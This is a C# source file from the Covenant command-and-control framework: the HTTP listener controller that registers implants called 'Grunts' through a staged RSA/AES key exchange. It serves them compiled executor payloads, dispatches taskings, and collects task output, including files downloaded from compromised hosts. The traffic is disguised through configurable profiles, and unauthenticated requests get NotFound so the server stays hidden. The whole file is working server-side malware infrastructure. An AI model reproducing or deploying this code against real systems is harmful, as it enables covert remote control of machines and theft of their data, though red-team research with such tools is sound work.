// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Security.Cryptography;

using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Authorization;
using Newtonsoft.Json;

using Covenant.API;
using Covenant.API.Models;
using Covenant.Core;
using Encrypt = Covenant.Core.Encryption;
using Covenant.Models.Listeners;

namespace Covenant.Controllers
{
    public class HttpListenerController : Controller
    {
		private readonly HttpListenerContext _context;
        private readonly ICovenantAPI CovenantClient;
		private readonly IHttpContextAccessor _httpContextAccessor;

		public HttpListenerController(HttpListenerContext context, ICovenantAPI api, IHttpContextAccessor httpContextAccessor)
        {
            this._context = context;
            this.CovenantClient = api;
			this._httpContextAccessor = httpContextAccessor;
        }

        private Covenant.Models.Listeners.HttpListener Listener
        {
            get
            {
                return _context.listener.FirstOrDefault();
            }
        }

        private Covenant.Models.Listeners.HttpProfile Profile
        {
            get
            {
                return Covenant.Models.Listeners.HttpProfile.Create(this.CovenantClient.ApiListenersByIdProfileGet(this.Listener.Id));
            }
        }

        private string GetCookie()
		{
			return _httpContextAccessor.HttpContext.Request.Cookies
                   .Where(C => this.Profile.GetCookies().Contains(C.Key))
                   .Select(C => C.Value)
                   .FirstOrDefault();
		}

        private void SetHeaders()
        {
            foreach (Models.Listeners.HttpProfile.HttpProfileHeader header in
                     JsonConvert.DeserializeObject<List<Models.Listeners.HttpProfile.HttpProfileHeader>>(this.Profile.HttpResponseHeaders))
            {
                Request.HttpContext.Response.Headers[header.Name] = header.Value;
            }
        }

        private string GetGetEmptyResponse()
        {
            return String.Format(this.Profile.HttpGetResponse, "");
        }

        private string GetPostEmptyResponse()
        {
            return String.Format(this.Profile.HttpPostResponse, "");
        }

        [AllowAnonymous]
		[HttpGet]
		public ActionResult<string> Get()
		{
            this.SetHeaders();
			string cookie = this.GetCookie();
            API.Models.Grunt gruntModel = this.CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.CookieAuthKey == cookie);
            if (gruntModel == null || gruntModel.Status != GruntStatus.Active)
			{
                // Invalid CookieAuthKey. May not be legitimate Grunt request, respond NotFound
                return NotFound();
			}
            gruntModel.LastCheckIn = DateTime.Now.ToString();
            CovenantClient.ApiGruntsPut(gruntModel);
            GruntTasking gruntTasking = CovenantClient.ApiGruntsByIdTaskingsGet(gruntModel.Id ?? default).FirstOrDefault(GT => GT.Status == GruntTaskingStatus.Uninitialized);
            if (gruntTasking == null)
            {
                // No GruntTasking assigned. Respond with empty template, 
                return Ok(this.GetGetEmptyResponse());
            }
            if (gruntTasking.Type == GruntTaskingType.Assembly)
            {
                GruntTask task = CovenantClient.ApiGruntTasksByIdGet(gruntTasking.TaskId ?? default);
                if (task == null)
                {
                    // Can't find corresponding task. Should never reach this point. Will just respond NotFound.
                    return NotFound();
                }
            }
            gruntTasking.Status = GruntTaskingStatus.Tasked;
            CovenantClient.ApiGruntsByIdTaskingsByTasknamePut(gruntTasking.GruntId ?? default, gruntTasking.Name, gruntTasking);

            string responseTasking = JsonConvert.SerializeObject(gruntTasking.TaskingMessage);
            var message = Covenant.Models.Grunts.GruntEncryptedMessage.Create(
                Covenant.Models.Grunts.Grunt.Create(gruntModel),
                Common.CovenantEncoding.GetBytes(responseTasking)
            );
            // Transform response
            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            // Format transformed response
            string response = String.Format(this.Profile.HttpPostResponse, transformed);
            return Ok(response);
        }

        [AllowAnonymous]
		[HttpPost]
		public ActionResult<string> Post()
        {
            this.SetHeaders();
            using (StreamReader reader = new StreamReader(Request.Body, System.Text.Encoding.UTF8))
            {
                Covenant.Models.Grunts.GruntEncryptedMessage message = null;
                try
                {
                    string body = reader.ReadToEnd();
                    string ExtractedMessage = body.ParseExact(this.Profile.HttpPostRequest).FirstOrDefault();
                    string inverted = Common.CovenantEncoding.GetString(this.Profile.Invert(ExtractedMessage));
                    message = JsonConvert.DeserializeObject<Covenant.Models.Grunts.GruntEncryptedMessage>(inverted);
                }
                catch (Exception)
                {
                    // Request not formatted correctly. May not be legitimate Grunt request, respond NotFound
                    return NotFound();
                }
                switch (message.Type)
                {
                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Stage0:
                        return this.PostStage0(message);
                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Stage1:
                        return this.PostStage1(message);
                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Stage2:
                        return this.PostStage2(message);
                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Register:
                        return this.RegisterGrunt(message);
                    case Covenant.Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.PostTask:
                        return this.PostTask(message);
                    default:
                        return NotFound();
                }
            }
        }
        
        // post task
		private ActionResult PostTask(Covenant.Models.Grunts.GruntEncryptedMessage outputMessage)
        {
            string cookie = this.GetCookie();
            API.Models.Grunt gruntModel = this.CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.CookieAuthKey == cookie);
            if (gruntModel == null || gruntModel.Status != GruntStatus.Active)
            {
                // Invalid CookieAuthKey. May not be legitimate Grunt request, respond NotFound
                return NotFound();
            }

			string TaskName = outputMessage.Meta;
            GruntTasking gruntTasking = CovenantClient.ApiGruntsByIdTaskingsByTasknameGet(gruntModel.Id ?? default, TaskName);
            if (gruntTasking == null || gruntModel.Id != gruntTasking.GruntId)
            {
				// Invalid taskname. May not be legitimate Grunt request, respond NotFound
				return NotFound();
            }

            var realGrunt = Covenant.Models.Grunts.Grunt.Create(gruntModel);
            if (realGrunt == null || realGrunt.Status != Covenant.Models.Grunts.Grunt.GruntStatus.Active)
            {
                // Invalid Grunt. May not be legitimate Grunt request, respond NotFound
                return NotFound();
            }
            if (!outputMessage.VerifyHMAC(Convert.FromBase64String(realGrunt.GruntNegotiatedSessionKey)))
            {
				// Invalid signature. Almost certainly not a legitimate Grunt request, responsd NotFound
                return NotFound();
            }
            string taskOutput = Common.CovenantEncoding.GetString(realGrunt.SessionDecrypt(outputMessage));
            gruntTasking.GruntTaskOutput = taskOutput;
            gruntTasking.Status = GruntTaskingStatus.Completed;
            if (gruntTasking.Type == GruntTaskingType.Kill)
            {
                gruntModel.Status = GruntStatus.Killed;
                CovenantClient.ApiGruntsPut(gruntModel);
            }
            CovenantClient.ApiGruntsByIdTaskingsByTasknamePut(gruntTasking.GruntId ?? default, gruntTasking.Name, gruntTasking);

            GruntTask DownloadTask = CovenantClient.ApiGruntTasksGet().FirstOrDefault(GT => GT.Name == "Download");
            if (gruntTasking.TaskId == DownloadTask.Id)
            {
                CovenantClient.ApiEventsPost(new EventModel
                {
                    Message = "Grunt: " + realGrunt.Name + " has completed GruntTasking: " + gruntTasking.Name,
                    Level = EventLevel.Highlight,
                    Context = realGrunt.Name
                });
                string FileName = Common.CovenantEncoding.GetString(Convert.FromBase64String(gruntTasking.GruntTaskingAssembly.Split(",")[1]));
                CovenantClient.ApiEventsDownloadPost(new DownloadEvent
                {
                    Message = "Downloaded: " + FileName + "\r\n" + "Syncing to Elite...",
                    Level = EventLevel.Info,
                    Context = realGrunt.Name,
                    FileName = FileName,
                    FileContents = gruntTasking.GruntTaskOutput,
                    Progress = DownloadProgress.Complete
                });
            }
            else
            {
                CovenantClient.ApiEventsPost(new EventModel
                {
                    Message = "Grunt: " + realGrunt.Name + " has completed GruntTasking: " + gruntTasking.Name,
                    Level = EventLevel.Highlight,
                    Context = realGrunt.Name
                });
                CovenantClient.ApiEventsPost(new EventModel
                {
                    Message = gruntTasking.GruntTaskOutput,
                    Level = EventLevel.Info,
                    Context = realGrunt.Name
                });
            }
			return Ok();
        }
        
        // stage0
		private ActionResult PostStage0(Covenant.Models.Grunts.GruntEncryptedMessage gruntStage0Response)
        {
            // Check if this Grunt ID is already active
            API.Models.Grunt savedGrunt = CovenantClient.ApiGruntsByIdGet(gruntStage0Response.Id);
            if (savedGrunt == null)
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            if(!gruntStage0Response.VerifyHMAC(Convert.FromBase64String(savedGrunt.GruntSharedSecretPassword)))
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            Covenant.Models.Grunts.Grunt realGrunt = null;
            if (savedGrunt.Status != GruntStatus.Uninitialized)
            {
                savedGrunt.Status = GruntStatus.Stage0;
                // We create a new Grunt if this one is not uninitialized
                API.Models.Grunt tempModel = new API.Models.Grunt
                {
                    Status = savedGrunt.Status,
                    ListenerId = savedGrunt.ListenerId,
                    CovenantIPAddress = savedGrunt.CovenantIPAddress,
                    GruntSharedSecretPassword = savedGrunt.GruntSharedSecretPassword,
                    Delay = savedGrunt.Delay, Jitter = savedGrunt.Jitter,
                    ConnectAttempts = savedGrunt.ConnectAttempts,
                    DotNetFrameworkVersion = savedGrunt.DotNetFrameworkVersion
                };
                API.Models.Grunt tempGrunt = CovenantClient.ApiGruntsPost(tempModel);
                realGrunt = Covenant.Models.Grunts.Grunt.Create(tempGrunt);
            }
            else
            {
                savedGrunt.Status = GruntStatus.Stage0;
                API.Models.Grunt tempGrunt = CovenantClient.ApiGruntsPut(savedGrunt);
                realGrunt = Covenant.Models.Grunts.Grunt.Create(tempGrunt);
            }

            // EncryptedMessage is the RSA Public Key
            realGrunt.GruntRSAPublicKey = Convert.ToBase64String(Encrypt.Utilities.AesDecrypt(
                gruntStage0Response,
                Convert.FromBase64String(realGrunt.GruntSharedSecretPassword)
            ));
            // Generate negotiated session key
            Aes newAesKey = Aes.Create();
            newAesKey.GenerateKey();
            realGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
            CovenantClient.ApiGruntsPut(realGrunt.ToModel());

            byte[] rsaEncryptedBytes = realGrunt.RSAEncrypt(Convert.FromBase64String(realGrunt.GruntNegotiatedSessionKey));

            Covenant.Models.Grunts.GruntEncryptedMessage message = Covenant.Models.Grunts.GruntEncryptedMessage.Create(
                realGrunt,
                rsaEncryptedBytes,
                Convert.FromBase64String(realGrunt.GruntSharedSecretPassword)
            );
            string Stage0Response = message.Id + "," + message.Name + "," + message.IV + "," + message.EncryptedMessage + "," + message.HMAC;
            // Stage0Response: "Id,Name,Base64(IV),Base64(AES(RSA(SessionKey))),Base64(HMAC)"
            // Transform response
            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(Stage0Response));
            // Format transformed response
            string response = String.Format(this.Profile.HttpPostResponse, transformed);
            return Ok(response);
        }

		private ActionResult PostStage1(Covenant.Models.Grunts.GruntEncryptedMessage gruntStage1Response)
        {
            // Check if this Grunt ID is already active
            API.Models.Grunt gruntModel = CovenantClient.ApiGruntsByIdGet(gruntStage1Response.Id);
            if (gruntModel == null || gruntModel.Status != GruntStatus.Stage0)
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            if (!gruntStage1Response.VerifyHMAC(Convert.FromBase64String(gruntModel.GruntNegotiatedSessionKey)))
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(gruntModel);
            byte[] challenge1 = realGrunt.SessionDecrypt(gruntStage1Response);
            byte[] challenge2 = new byte[4];
            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(challenge2);
            }
            // Save challenge to compare on response
            realGrunt.GruntChallenge = Convert.ToBase64String(challenge2);

            Covenant.Models.Grunts.GruntEncryptedMessage message = Covenant.Models.Grunts.GruntEncryptedMessage.Create(realGrunt, challenge1.Concat(challenge2).ToArray());

            string Stage1Response = message.IV + "," + message.EncryptedMessage + "," + message.HMAC;
            // Stage1Response: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"

            realGrunt.Status = Covenant.Models.Grunts.Grunt.GruntStatus.Stage1;
            CovenantClient.ApiGruntsPut(realGrunt.ToModel());

            // Transform response
            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(Stage1Response));
            // Format transformed response
            string response = String.Format(this.Profile.HttpPostResponse, transformed);
            return Ok(response);
        }

        public ActionResult PostStage2(Covenant.Models.Grunts.GruntEncryptedMessage gruntStage2Response)
        {
            // Check if this Grunt ID is already active
            API.Models.Grunt gruntModel = CovenantClient.ApiGruntsByIdGet(gruntStage2Response.Id);
            if (gruntModel == null || gruntModel.Status != GruntStatus.Stage1)
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            if (!gruntStage2Response.VerifyHMAC(Convert.FromBase64String(gruntModel.GruntNegotiatedSessionKey)))
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(gruntModel);
            byte[] challenge2test = realGrunt.SessionDecrypt(gruntStage2Response);
            if (realGrunt.GruntChallenge != Convert.ToBase64String(challenge2test))
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            realGrunt.Status = Covenant.Models.Grunts.Grunt.GruntStatus.Stage2;
            this.CovenantClient.ApiGruntsPut(realGrunt.ToModel());
            API.Models.HttpListener listenerModel = this.CovenantClient.ApiListenersHttpByIdGet(realGrunt.ListenerId);
            API.Models.HttpProfile profileModel = this.CovenantClient.ApiListenersByIdProfileGet(realGrunt.ListenerId);
            var realListener = Covenant.Models.Listeners.HttpListener.Create(listenerModel);
            string GruntExecutorAssembly = realListener.CompileGruntExecutorCode(realGrunt, Covenant.Models.Listeners.HttpProfile.Create(profileModel));
            var message = Covenant.Models.Grunts.GruntEncryptedMessage.Create(realGrunt, Convert.FromBase64String(GruntExecutorAssembly));

            string Stage2Response = message.IV + "," + message.EncryptedMessage + "," + message.HMAC;
            // returns: "Base64(IV),Base64(AES(GruntExecutorAssembly)),Base64(HMAC)"
            // Transform response
            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(Stage2Response));
            // Format transformed response
            string response = String.Format(this.Profile.HttpPostResponse, transformed);
            return Ok(response);
        }

		private ActionResult RegisterGrunt(Covenant.Models.Grunts.GruntEncryptedMessage gruntMessage)
		{
            API.Models.Grunt gruntModel = CovenantClient.ApiGruntsByIdGet(gruntMessage.Id);
			if (gruntModel == null || gruntModel.Status != GruntStatus.Stage2)
			{
				// Always return NotFound, don't give away unnecessary info
				return NotFound();
			}
			if (!gruntMessage.VerifyHMAC(Convert.FromBase64String(gruntModel.GruntNegotiatedSessionKey)))
			{
				// Always return NotFound, don't give away unnecessary info
				return NotFound();
			}
			Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(gruntModel);
			string message = Common.CovenantEncoding.GetString(realGrunt.SessionDecrypt(gruntMessage));
			// todo: try/catch on deserialize?
			Covenant.Models.Grunts.Grunt grunt = JsonConvert.DeserializeObject<Covenant.Models.Grunts.Grunt>(message);

			gruntModel.IpAddress = grunt.IPAddress;
			gruntModel.OperatingSystem = grunt.OperatingSystem;
			gruntModel.UserDomainName = grunt.UserDomainName;
			gruntModel.UserName = grunt.UserName;
			gruntModel.Status = GruntStatus.Active;
			gruntModel.Integrity = (API.Models.IntegrityLevel)Enum.Parse(typeof(API.Models.IntegrityLevel), grunt.Integrity.ToString());
			gruntModel.Process = grunt.Process;

			CovenantClient.ApiGruntsPut(gruntModel);
			CovenantClient.ApiEventsPost(new EventModel
			{
				Message = "Grunt: " + grunt.Name + " from: " + grunt.IPAddress + " has been activated!",
				Level = EventLevel.Highlight,
				Context = "*"
			});

            var responseMessage = Covenant.Models.Grunts.GruntEncryptedMessage.Create(
                Covenant.Models.Grunts.Grunt.Create(gruntModel), Common.CovenantEncoding.GetBytes(gruntModel.CookieAuthKey)
            );
            // Transform response
            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
            // Format transformed response
            string response = String.Format(this.Profile.HttpPostResponse, transformed);
            return Ok(response);
        }
    }
}
